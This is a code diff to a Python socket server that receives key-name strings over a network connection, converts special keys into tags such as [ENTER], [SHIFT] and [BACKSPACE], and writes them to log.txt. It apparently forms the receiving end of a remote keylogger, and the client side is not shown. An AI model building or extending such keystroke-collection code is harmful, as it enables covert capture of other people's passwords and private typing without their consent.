@@ -1,15 +1,32 @@
 import socket
-
-BUFFER_SIZE = 10
-
 import logging
 
-def log_bytearray_to_file(buffer: bytearray, filename: str):
-    if not isinstance(buffer, bytearray):
-        raise TypeError("buffer must be a bytearray")
+BUFFER_SIZE = 10
+SPECIAL_KEYS = {
+    "Key.space": " ",
+    "Key.enter": " [ENTER] ",
+    "Key.tab": " [TAB] ",
+    "Key.esc": " [ESC] ",
+    "Key.shift": " [SHIFT] ",
+    "Key.shift_r": " [SHIFT] ",
+    "Key.ctrl": " [CTRL] ",
+    "Key.ctrl_r": " [CTRL] ",
+    "Key.alt": " [ALT] ",
+    "Key.alt_r": " [ALT] ",
+    "Key.backspace": " [BACKSPACE] ",
+    "Key.delete": " [DEL] ",
+    "Key.caps_lock": " [CAPSLOCK] ",
+    "Key.cmd": " [WIN] ",
+    "Key.cmd_r": " [WIN] ",
+    "Key.up": " [UP] ",
+    "Key.down": " [DOWN] ",
+    "Key.left": " [LEFT] ",
+    "Key.right": " [RIGHT] ",
+}
 
-    with open(filename, "ab") as f:  # append in binary mode
-        f.write(buffer.replace(b"\n", b" ") + b"\n")
+def beautify_key(raw: str) -> str:
+    raw = raw.strip().replace("'", "").replace('"', "")
+    return SPECIAL_KEYS.get(raw, raw)
 
 def beautify_log(filename):
     file = open(filename, 'r')
@@ -30,9 +47,15 @@ def main():
     
     while True:
         if len(buffer) <= BUFFER_SIZE:
-            data = conn.recv(1)
+            data = conn.recv(32)
             if data:
-                buffer += data.decode("utf-8")
+                decoded = data.decode("utf-8", errors="ignore")
+                if not decoded:
+                    continue
+                beautified = beautify_key(decoded)
+                if buffer.endswith(" ") and beautified.startswith(" "):
+                    beautified = beautified.lstrip()
+                buffer += beautified
             else:
                 print("No data has been received")
                 beautify_log("log.txt")
